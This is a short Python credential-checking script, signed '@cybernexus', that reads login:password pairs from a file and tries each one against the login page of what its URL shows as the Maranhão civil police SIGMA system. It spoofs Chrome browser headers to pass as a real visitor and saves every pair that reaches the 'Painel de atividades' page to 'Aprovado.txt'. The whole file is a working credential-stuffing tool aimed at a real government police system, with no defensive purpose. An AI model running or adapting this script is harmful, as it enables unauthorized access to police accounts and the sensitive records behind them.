import requests
from colorama import Fore, Style

def verificar_log(login, password):
    url = "https://sigma.policiacivil.ma.gov.br"
    headers = {
        "Host": "sigma.policiacivil.ma.gov.br",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "Upgrade-Insecure-Requests": "1",
        "Origin": "https://sigma.policiacivil.ma.gov.br",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://sigma.policiacivil.ma.gov.br/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6",
    }
    data = {
        "username": login,
        "password": password,
    }

    session = requests.Session()
    response = session.post(url, headers=headers, data=data)

    if "Painel de atividades" in response.text:
        print(f"{Fore.BLUE}[+] Aprovado | {login} | {password}{Style.RESET_ALL}| @cybernexus")
        with open("Aprovado.txt", "a") as arquivo:
            arquivo.write(f"Aprovado | {login} | {password} | @cybernexus\n")
    else:
        print(f"{Fore.RED}[+] Reprovado | {login} | {password}{Style.RESET_ALL}{Fore.YELLOW}| @cybernexus{Style.RESET_ALL}")

with open("sigma.txt", "r") as arquivo:
    for linha in arquivo:
        login, password = linha.strip().split(":")
        verificar_log(login.strip(), password.strip())